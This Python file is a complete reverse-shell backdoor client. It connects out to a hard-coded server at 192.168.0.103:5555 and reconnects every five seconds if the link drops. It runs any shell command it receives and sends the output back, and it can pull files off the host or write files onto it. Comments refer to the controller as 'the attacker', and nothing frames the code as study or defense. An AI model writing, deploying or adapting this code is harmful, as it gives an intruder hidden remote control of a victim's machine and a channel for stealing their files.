import os
import socket
import json
import subprocess
import time

SERVER_IP = "192.168.0.103"  # ip of server
SERVER_PORT = 5555


# Function to send data reliably
def reliable_send(data):
    json_data = json.dumps(data)
    target_sock.send(json_data.encode())


# Function to receive data reliably
def reliable_recv():
    data = ""
    while True:
        try:
            data += target_sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


# Function to download a file from the server
def download_file(filename):
    with open(filename, "wb") as file:
        target_sock.settimeout(1)
        try:
            chunk = target_sock.recv(1024)
            while chunk:
                file.write(chunk)
                chunk = target_sock.recv(1024)
        except socket.timeout:
            pass
        target_sock.settimeout(None)


# Function to upload a file to the server
def upload_file(filename):
    with open(filename, "rb") as file:
        target_sock.send(file.read())


# Function to establish connection with the server
def connection():
    while True:
        time.sleep(5)  # Wait for 5 seconds before reconnecting if connection is lost
        try:
            target_sock.connect(
                (SERVER_IP, SERVER_PORT)
            )  # Try to connect to the server
            shell()  # Once connected, enter the shell function
        except:
            connection()  # If connection fails, try again


# Function to handle shell commands from the attacker
def shell():
    while True:
        command = reliable_recv()  # Receive command from server

        if command == "quit":  # Exit condition
            break
        elif command[:3] == "cd ":
            try:
                os.chdir(command[3:])  # Change directory
                reliable_send(f"Changed directory to {os.getcwd()}")
            except FileNotFoundError:
                reliable_send("Directory not found.")
        elif command[:9] == "download ":
            upload_file(command[9:])  # Upload file to server
        elif command[:7] == "upload ":
            download_file(command[7:])  # Download file from server
        else:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True
            )  # Execute system command
            reliable_send(
                result.stdout + result.stderr
            )  # Send the command result back to the server


# Set up socket connection
target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Establish connection with the server
connection()
